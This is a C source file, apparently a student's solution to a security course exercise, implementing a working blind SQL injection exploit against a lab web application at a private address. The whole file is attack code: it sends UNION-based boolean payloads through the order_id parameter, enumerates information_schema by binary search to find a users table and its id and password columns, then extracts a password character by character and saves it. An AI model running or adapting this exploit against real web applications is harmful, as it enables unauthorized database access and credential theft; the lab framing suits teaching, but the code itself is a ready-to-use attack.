#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ID "319028957"         //  gevas ID 
#define TARGET_IP "192.168.1.202"
// HTTP port for the vulnerable web application
#define TARGET_PORT 80
// maximum number of SQL queries allowed
#define MAX_QUERIES 400
// max buffer size 4 HTTP responses
#define BUFFER_SIZE 8192
// max buffer size 4 URL
#define URL_BUFFER_SIZE 4096
#define MAX_METADATA_BUFFER_SIZE 512
#define MAX_PASSWORD_BUFFER_SIZE 512
// succ indicator string in HTTP response
#define SUCCESS_STRING "Your order has been sent!"

// global counter to track num of queries sent
static int query_counter = 0;

// all function prototypes
int create_socket_connection(void);
void construct_http_request(const char *encoded_payload, char *request, size_t request_size);
bool transmit_http_request(int sockfd, const char *request);
bool analyze_http_response(int sockfd);

/**
 * URL-encodes a string for safe transmission in HTTP requests.
 * 
 * Encodes special characters as %XX hex codes, spaces as %20.
 * Unreserved characters (A-Z, a-z, 0-9, -, _, ., ~) are left unchanged.
 * 
 * @param src Source string to encode
 * @param dest Destination buffer for encoded string
 * @param dest_size Size of destination buffer
 */
void url_encode(const char *src, char *dest, size_t dest_size) {
    // hex lookup table for encoding
    const char *hex = "0123456789ABCDEF";
    // current position in destination buffer
    size_t pos = 0;
    
    // process each character in source string
    while (*src && pos < dest_size - 4) {
        // check if character is alphanum or safe symbol
        if ((*src >= 'A' && *src <= 'Z') ||
            (*src >= 'a' && *src <= 'z') ||
            (*src >= '0' && *src <= '9') ||
            *src == '-' || *src == '_' || *src == '.' || *src == '~') {
            // Copy character as-is
            dest[pos++] = *src;
        } else if (*src == ' ') {
            // encode space as %20
            dest[pos++] = '%';
            dest[pos++] = '2';
            dest[pos++] = '0';
        } else {
            // encode other characters as %XX (hex representation)
            dest[pos++] = '%';
            // High nibble (upper 4 bits)
            dest[pos++] = hex[((unsigned char)*src) >> 4];
            // Low nibble (lower 4 bits)
            dest[pos++] = hex[((unsigned char)*src) & 0x0F];
        }
        // move to next source character
        src++;
    }
    // NULL-terminate the encoded string
    dest[pos] = '\0';
}

/**
 * Tests a boolean SQL condition using UNION-based blind SQL injection.
 * Uses "order_id=-1 UNION SELECT 1 WHERE (condition)" payload.
 * The -1 ensures no results from original query, UNION adds our test row.
 * 
 * @param sql_condition SQL boolean expression to test
 * @return true if condition evaluates to TRUE, false otherwise
 */
bool test_sql_condition(const char *sql_condition) {
    // check if we've exceeded query limit
    if (query_counter >= MAX_QUERIES) {
        fprintf(stderr, "Error: Maximum query limit reached\n");
        return false;
    }
    // increment query count
    query_counter++;
    
    // buffer for constructing the SQL injection payload
    char payload[2048];
    // build UNION-based injection: -1 returns nothing, UNION adds row if condition is TRUE
    snprintf(payload, sizeof(payload),
        "-1 UNION SELECT 1 WHERE (%s)",
        sql_condition);
    
    // buffer for URL-encoded version of payload
    char encoded_payload[URL_BUFFER_SIZE];
    // encode payload
    url_encode(payload, encoded_payload, sizeof(encoded_payload));
    
    // buffer for complete HTTP request
    char request[BUFFER_SIZE];
    // construct HTTP GET request with encoded payload
    construct_http_request(encoded_payload, request, sizeof(request));
    
    // create new TCP connection to web server
    int sockfd = create_socket_connection();
    if (sockfd < 0) {
        return false;
    }
    
    // send HTTP request to server
    if (!transmit_http_request(sockfd, request)) {
        close(sockfd);
        return false;
    }
    
    // receive and analyze response (TRUE if success string found)
    bool result = analyze_http_response(sockfd);
    // clean up socket conn
    close(sockfd);
    
    return result;
}

/**
 * Determines the length of a string result from SQL query using binary search.
 * Efficiently finds length in O(log n) queries instead of linear search.
 * Range tested: 1 to 32 characters.
 * 
 * @param sql_query SQL query that returns a string
 * @return Length of the string (0 if empty or error)
 */
int determine_string_length(const char *sql_query) {
    // Binary search boundaries
    int lower_bound = 1;
    int upper_bound = 32;
    
    // Binary search loop
    while (lower_bound < upper_bound) {
        // Calculate midpoint
        int midpoint = lower_bound + (upper_bound - lower_bound) / 2;
        
        // Buffer for length test condition
        char condition[2048];
        // Test if length is greater than midpoint
        snprintf(condition, sizeof(condition),
            "CHAR_LENGTH((%s)) > %d", sql_query, midpoint);
        
        // Adjust search range based on result
        if (test_sql_condition(condition)) {
            // Length is greater, search upper half
            lower_bound = midpoint + 1;
        } else {
            // Length is less than or equal, search lower half
            upper_bound = midpoint;
        }
    }
    
    // Verify the result isn't actually zero (empty string)
    if (lower_bound == 1) {
        char condition[2048];
        snprintf(condition, sizeof(condition),
            "CHAR_LENGTH((%s)) = 1", sql_query);
        // If length is not 1, it must be 0
        if (!test_sql_condition(condition)) {
            return 0;
        }
    }
    
    return lower_bound;
}

/**
 * Extracts a single character from SQL query result using binary search on ASCII values.
 * Searches ASCII range 32-126 (printable characters).
 * Uses O(log n) queries per character.
 * 
 * @param sql_query SQL query that returns a string
 * @param position Character position to extract (1-indexed)
 * @return The character at specified position
 */
char extract_single_character(const char *sql_query, int position) {
    // Binary search boundaries (printable ASCII range)
    int lower_ascii = 32;
    int upper_ascii = 126;
    
    // Binary search for ASCII value
    while (lower_ascii < upper_ascii) {
        // Calculate midpoint ASCII value
        int mid_ascii = lower_ascii + (upper_ascii - lower_ascii) / 2;
        
        // Buffer for ASCII comparison condition
        char condition[2048];
        // Test if ASCII value is greater than midpoint
        snprintf(condition, sizeof(condition),
            "ASCII(SUBSTRING((%s), %d, 1)) > %d",
            sql_query, position, mid_ascii);
        
        // Adjust search range based on result
        if (test_sql_condition(condition)) {
            // ASCII is greater, search upper half
            lower_ascii = mid_ascii + 1;
        } else {
            // ASCII is less than or equal, search lower half
            upper_ascii = mid_ascii;
        }
    }
    
    // Return the found character
    return (char)lower_ascii;
}

/**
 * Extracts complete string from SQL query result character by character.
 * First determines length, then extracts each character using binary search.
 * 
 * @param sql_query SQL query that returns the target string
 * @param output Buffer to store extracted string
 * @param max_length Maximum expected length
 * @return true on success, false on error
 */
bool retrieve_complete_string(const char *sql_query, char *output, int max_length) {
    // actual length of string
    int actual_length = determine_string_length(sql_query);
    
    // handle empty string case
    if (actual_length == 0) {
        output[0] = '\0';
        return true;
    }
    
    // cap length at maximum allowed
    if (actual_length > max_length) {
        actual_length = max_length;
    }
    
    // extract each character sequentially
    for (int i = 1; i <= actual_length; i++) {
        // get character at position i (1-indexed)
        output[i - 1] = extract_single_character(sql_query, i);
    }
    
    // NULL-terminate the string
    output[actual_length] = '\0';
    return true;
}

/**
 * Discovers the table name containing 'usr' substring from information_schema.
 * Queries the database metadata to find matching table.
 * 
 * @param table_name Buffer to store discovered table name
 * @return true on success, false on error
 */
bool find_table_name(char *table_name) {
    // SQL query to find table with 'usr' in its name
    const char *query = "SELECT table_name FROM information_schema.tables "
                        "WHERE table_schema = '67607db' AND table_name LIKE '%usr%' "
                        "LIMIT 1";
    
    // Extract table name (max 10 characters per PDF)
    if (!retrieve_complete_string(query, table_name, 10)) {
        fprintf(stderr, "Error: Could not find table name\n");
        return false;
    }
    
    // Verify we got a result
    if (strlen(table_name) == 0) {
        fprintf(stderr, "Error: Table name is empty\n");
        return false;
    }
    
    return true;
}

/**
 * Discovers a column name containing specified pattern from information_schema.
 * Searches for columns matching pattern (e.g., 'id' or 'pwd').
 * 
 * @param table_name Table to search in
 * @param pattern Pattern to match in column name
 * @param column_name Buffer to store discovered column name
 * @return true on success, false on error
 */
bool find_column_name(const char *table_name, const char *pattern, char *column_name) {
    // buffer for constructing metadata query
    char query[MAX_METADATA_BUFFER_SIZE];
    // Build query to find column with matching pattern
    snprintf(query, sizeof(query),
        "SELECT column_name FROM information_schema.columns "
        "WHERE table_schema = '67607db' AND table_name = '%s' "
        "AND column_name LIKE '%%%s%%' LIMIT 1",
        table_name, pattern);
    
    // Extract column name (max 10 characters per PDF)
    if (!retrieve_complete_string(query, column_name, 10)) {
        // fprintf(stderr, "Error: Could not find column with pattern '%s'\n", pattern);
        return false;
    }
    
    // Verify we got a result
    if (strlen(column_name) == 0) {
        // fprintf(stderr, "Error: Column name is empty\n");
        return false;
    }
    
    return true;
}

/**
 * Creates a new TCP socket and connects to the target web server.
 * Configures socket for IPv4 stream communication.
 * 
 * @return Socket file descriptor on success, -1 on failure
 */
int create_socket_connection(void) {
    // Create TCP socket (IPv4, stream-based)
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        // fprintf(stderr, "Error: Socket creation failed\n");
        exit(1);
    }
    
    // Server address structure
    struct sockaddr_in server_addr;
    // Zero out structure
    memset(&server_addr, 0, sizeof(server_addr));
    // Set address family to IPv4
    server_addr.sin_family = AF_INET;
    // Set port (convert to network byte order)
    server_addr.sin_port = htons(TARGET_PORT);
    
    // Convert IP address string to binary form
    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
        // fprintf(stderr, "Error: Invalid IP address\n");
        close(sockfd);
        exit(1);
    }
    
    // Establish TCP connection to server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        // fprintf(stderr, "Error: Connection failed\n");
        close(sockfd);
        exit(1);
    }
    
    return sockfd;
}

/**
 * Constructs HTTP GET request with SQL injection payload in order_id parameter.
 * Uses HTTP/1.1 with proper headers for the vulnerable web application.
 * 
 * @param encoded_payload URL-encoded SQL injection payload
 * @param request Buffer to store constructed HTTP request
 * @param request_size Size of request buffer
 */
void construct_http_request(const char *encoded_payload, char *request, size_t request_size) {
    // Build HTTP GET request with injection in order_id parameter
    snprintf(request, request_size,
        "GET /index.php?order_id=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        encoded_payload, TARGET_IP);
}

/**
 * Transmits HTTP request over established socket connection.
 * Ensures complete request is sent.
 * 
 * @param sockfd Socket file descriptor
 * @param request HTTP request string to send
 * @return true if fully sent, false on error
 */
bool transmit_http_request(int sockfd, const char *request) {
    // Calculate request length
    size_t request_len = strlen(request);
    // Send request over socket
    ssize_t bytes_sent = send(sockfd, request, request_len, 0);
    // Verify all bytes were sent
    if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {
        // fprintf(stderr, "Error: Request transmission failed\n");
        return false;
    }
    return true;
}

/**
 * Receives HTTP response from server and checks for success indicator string.
 * Reads response in chunks until connection closes or buffer fills.
 * 
 * @param sockfd Socket file descriptor
 * @return true if success string found in response, false otherwise
 */
bool analyze_http_response(int sockfd) {
    // Buffer for storing response
    char buffer[BUFFER_SIZE];
    // Track total bytes received
    ssize_t total_received = 0;
    // Bytes received in current read
    ssize_t bytes_received;
    
    // Read response in chunks
    while ((bytes_received = recv(sockfd, buffer + total_received, 
                                   (size_t)(BUFFER_SIZE - total_received - 1), 0)) > 0) {
        // accum received bytes
        total_received += bytes_received;
        // stop if buffer nearly full
        if (total_received >= BUFFER_SIZE - 1) {
            break;
        }
    }
    
    // Check for receive error
    if (total_received <= 0) {
        fprintf(stderr, "Error: Response receive failed\n");
        return false;
    }
    
    // NULL-terminate response
    buffer[total_received] = '\0';
    // Check if success string is present
    return (strstr(buffer, SUCCESS_STRING) != NULL);
}

/**
 * Extracts password for specified ID from discovered table.
 * Constructs SELECT query and retrieves password character by character.
 * 
 * @param table_name Name of table containing passwords
 * @param id_col Name of ID column
 * @param pwd_col Name of password column
 * @param password Buffer to store extracted password
 * @return true on success, false on error
 */
bool retrieve_password(const char *table_name, const char *id_col, 
                       const char *pwd_col, char *password) {
    // buffer for password extraction query
    char query[MAX_PASSWORD_BUFFER_SIZE];
    // Build SELECT query for password matching our ID
    snprintf(query, sizeof(query),
        "SELECT %s FROM %s WHERE %s = '%s' LIMIT 1",
        pwd_col, table_name, id_col, ID);
    
    // extract password (max 10 characters per PDF)
    if (!retrieve_complete_string(query, password, 10)) {
        fprintf(stderr, "Error: Password extraction failed\n");
        return false;
    }
    
    return true;
}

/**
 * Writes extracted password to text file named [ID].txt.
 * Format: *password* (with asterisks as per PDF requirement).
 * 
 * @param password Password string to write
 * @return true on success, false on error
 */
bool save_password_to_file(const char *password) {
    // Buffer for filename
    char filename[64];
    // Construct filename from student ID
    snprintf(filename, sizeof(filename), "%s.txt", ID);
    
    // Open file for writing
    FILE *file = fopen(filename, "w");
    if (!file) {
        // fprintf(stderr, "Error: File creation failed\n");
        return false;
    }
    
    // Write password with asterisk delimiters (per PDF requirement)
    if (fprintf(file, "*%s*", password) < 0) {
        // fprintf(stderr, "Error: File write failed\n");
        fclose(file);
        return false;
    }
    
    // Close file
    fclose(file);
    return true;
}

int main(void) {
    // Buffers for discovered schema elements
    char table_name[16] = {0};
    char id_col[16] = {0};
    char pwd_col[16] = {0};
    char password[16] = {0};
    
    // Validate oracle is working (test TRUE condition)
    if (!test_sql_condition("1=1")) {
        fprintf(stderr, "Error: Oracle validation failed (1=1 test)\n");
        exit(1);
    }
    
    // Validate oracle is working (test FALSE condition)
    if (test_sql_condition("1=0")) {
        fprintf(stderr, "Error: Oracle validation failed (1=0 test)\n");
        exit(1);
    }
    
    // Step 1: Discover table name containing 'usr'
    if (!find_table_name(table_name)) {
        fprintf(stderr, "Error: Table discovery failed\n");
        exit(1);
    }
    
    // Step 2: Discover ID column name containing 'id'
    if (!find_column_name(table_name, "id", id_col)) {
        fprintf(stderr, "Error: ID column discovery failed\n");
        exit(1);
    }
    
    // Step 3: Discover password column name containing 'pwd'
    if (!find_column_name(table_name, "pwd", pwd_col)) {
        fprintf(stderr, "Error: Password column discovery failed\n");
        exit(1);
    }
    
    // Step 4: Extract password for our ID
    if (!retrieve_password(table_name, id_col, pwd_col, password)) {
        fprintf(stderr, "Error: Password retrieval failed\n");
        exit(1);
    }
    
    // Step 5: Save password to file
    if (!save_password_to_file(password)) {
        exit(1);
    }
    
    // Success - exit with code 0
    exit(0);
}
